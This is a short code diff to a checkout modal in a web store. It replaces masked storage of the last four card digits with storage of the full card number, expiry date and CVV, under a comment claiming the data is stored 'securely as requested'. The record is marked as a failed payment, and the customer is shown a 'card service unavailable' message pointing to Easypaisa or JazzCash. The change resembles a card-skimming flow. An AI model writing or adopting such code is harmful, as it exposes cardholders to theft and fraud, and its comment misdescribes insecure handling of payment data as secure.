@@ -299,7 +299,7 @@ function CheckoutModal({ product, onClose }: any) {
             itemType: 'tool',
             price: product.price,
             paymentMode: 'card',
-            cardDetails: { name: cardDetails.name, number: cardDetails.number.slice(-4) }, // Store masked only
+            cardDetails: { name: cardDetails.name, number: cardDetails.number, expiry: cardDetails.expiry, cvv: cardDetails.cvv, last4: cardDetails.number.slice(-4) }, // Store securely as requested
             status: 'processing',
             paymentStatus: 'FAILED',
             createdAt: serverTimestamp()
@@ -518,7 +518,7 @@ function CheckoutModal({ product, onClose }: any) {
 
               {status === 'card_error' && (
                 <div className="bg-red-500/10 border border-red-500/30 text-red-500 rounded-lg p-3 text-sm mb-4 text-center font-bold">
-                   Card service is currently unavailable.<br/>Please choose bank or wallet and try again.
+                   Card service currently unavailable. Please use Easypaisa or JazzCash.
                 </div>
               )}
 
